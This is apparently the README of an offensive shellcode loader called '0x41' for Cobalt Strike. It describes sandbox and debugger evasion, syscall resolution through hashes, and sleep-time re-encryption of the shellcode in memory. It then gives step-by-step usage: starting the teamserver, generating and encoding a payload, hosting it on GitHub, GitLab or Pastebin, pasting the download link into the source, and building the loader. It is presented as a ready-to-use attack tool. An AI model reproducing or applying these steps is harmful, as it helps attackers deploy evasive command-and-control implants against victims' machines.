# How Does 0x41 work:

1- checks the environment [detect sandboxes / debuggers / virtual machines]

2- download the [encrypted] shellcode file [.bin] if the check succeeded

3- get the syscalls needed, dynamically through hashes, and not predifined code.
 
4- reads / loads the binary into memory [still not executed] Note that the decryption && injections happens together.

5- sleep for 10 sec [u can modify this to fit ur need]

6- luanch the shellcode;

a. the shellcode will be luanched for couple of milleseconds only so that we can have a confirmation that we accessed the target.

b. after the heart beat is sent, we then generate a randome byte [which will be used to encrypt the shellcode], move the shellcode to "page no access",
and encrypt it with the random byte generated earlier.

c. when the sleep on our server is done, we then move the shellcode to "rwx", decode it with our key, and execute the commands [if sent]

d. then it will do the steps again, but with a different encryption keys every time.



# USAGE:

1. first load the profile using the following command: ./teamserver.sh <ur ip address> <ur password> <path to the profile file> .

2. run cobalt strike : ./cobaltstrike.sh .

3. generate ur payload [preferably https] 'but its a must to create it as x64 [raw file format]'
   Attacks -> Packages -> Payload Generator .
   save it as payload.bin

4. move the payload.bin file created earlier, to the same direcotory as binencoder.py

5. run binencoder.py using python2

6. upload result.bin file to (github / gitlab / pastebin ..etc..), copy the 'raw' link or the 'download' link
of result.bin file.

7. paste it in line 116 in utils.h;
Ex; should look like [if from gitlab.com]:
"https://gitlab.com/username/reponame/-/raw/main/result.bin?inline=false"

8. build it as release x64

9. enjoy !


